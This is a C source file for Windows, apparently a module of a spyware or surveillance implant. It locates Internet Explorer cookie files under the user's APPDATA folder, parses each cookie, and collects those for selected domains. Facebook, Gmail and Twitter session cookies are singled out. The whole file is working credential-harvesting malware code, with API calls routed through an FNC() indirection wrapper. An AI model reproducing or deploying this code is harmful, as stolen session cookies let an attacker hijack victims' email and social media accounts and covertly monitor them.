#include <windows.h>
#define _CRT_SECURE_NO_WARNINGS 1
#include <stdio.h>
#include "..\\common.h"
#include "CookieHandler.h"
#include "SocialMain.h"

void ParseIECookieFile(WCHAR *file)
{
	char *session_memory = NULL;
	DWORD session_size;
	HANDLE h_session_file;
	DWORD n_read = 0;
	char *ptr, *name, *value, *host;

	h_session_file = FNC(CreateFileW)(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (h_session_file == INVALID_HANDLE_VALUE)
		return;
	session_size = GetFileSize(h_session_file, NULL);
	if (session_size == INVALID_FILE_SIZE || session_size == 0) {
		CloseHandle(h_session_file);
		return;
	}
	session_memory = (char *)malloc(session_size + sizeof(WCHAR));
	if (!session_memory) {
		CloseHandle(h_session_file);
		return;
	}
	memset(session_memory, 0, session_size + sizeof(WCHAR));
	if (!ReadFile(h_session_file, session_memory, session_size, &n_read, NULL)) {
		CloseHandle(h_session_file);
		SAFE_FREE(session_memory);
		return;
	}
	CloseHandle(h_session_file);
	if (n_read != session_size) {
		SAFE_FREE(session_memory);
		return;
	}

	ptr = session_memory;
	for(;;) {
		name = ptr;
		if (!(ptr = strchr(ptr, '\n')))
			break;
		*ptr = 0;
		ptr++;
		value = ptr;
		if (!(ptr = strchr(ptr, '\n')))
			break;
		*ptr = 0;
		ptr++;
		host = ptr;
		if (!(ptr = strchr(ptr, '\n')))
			break;
		*ptr = 0;
		ptr++;
		if (!(ptr = strstr(ptr, "*\n")))
			break;
		ptr+=2;
		NormalizeDomainA(host);
		if (host && name && value && IsInterestingDomainA(host))
			AddCookieA(host, name, value);
	} 
	SAFE_FREE(session_memory);
}

WCHAR *GetIEProfilePath(WCHAR *cookie_path)
{
	static WCHAR FullPath[MAX_PATH];
	WCHAR appPath[MAX_PATH];

	memset(appPath, 0, sizeof(appPath));
	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
	_snwprintf_s(FullPath, MAX_PATH, L"%s\\%s", appPath, cookie_path);  
	return FullPath;
}

// Divide e parsa i singoli cookie all'interno di uno stringone
void ParseSessionCookies(char *cookie_string, char *domain)
{
	char *ptr1, *ptr2, *ptr3;
	
	if (strlen(cookie_string) == 0)
		return;

	ptr1 = cookie_string;
	do {
		ptr2 = strchr(ptr1, ';');
		if (ptr2) 
			*ptr2 = NULL;
	
		ptr3 = strchr(ptr1, '=');
		if (ptr3) {
			*ptr3 = NULL;
			ptr3++;
			AddCookieA(domain, ptr1, ptr3);
		}

		ptr1 = ptr2;
		if (ptr1) {
			ptr1++;
			if (*ptr1 == ' ')
				ptr1++;
		}
	} while(ptr1);
}

int DumpIECookies(WCHAR *cookie_path)
{
	WCHAR *ie_dir;
	WIN32_FIND_DATAW find_data;
	WCHAR cookie_search[MAX_PATH];
	HANDLE hFind;

	ParseSessionCookies(FACEBOOK_IE_COOKIE, FACEBOOK_DOMAINA);
	ParseSessionCookies(GMAIL_IE_COOKIE, GMAIL_DOMAINA);
	ParseSessionCookies(TWITTER_IE_COOKIE, TWITTER_DOMAINA);

	ie_dir = GetIEProfilePath(cookie_path);
	_snwprintf_s(cookie_search, MAX_PATH, L"%s\\*", ie_dir);  

	hFind = FNC(FindFirstFileW)(cookie_search, &find_data);
	if (hFind == INVALID_HANDLE_VALUE)
		return 0;
	do {
		if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
			continue;
		_snwprintf_s(cookie_search, MAX_PATH, _TRUNCATE, L"%s\\%s", ie_dir, find_data.cFileName); 
		ParseIECookieFile(cookie_search);
	} while (FNC(FindNextFileW)(hFind, &find_data));
	FNC(FindClose)(hFind);
	return 1;
}
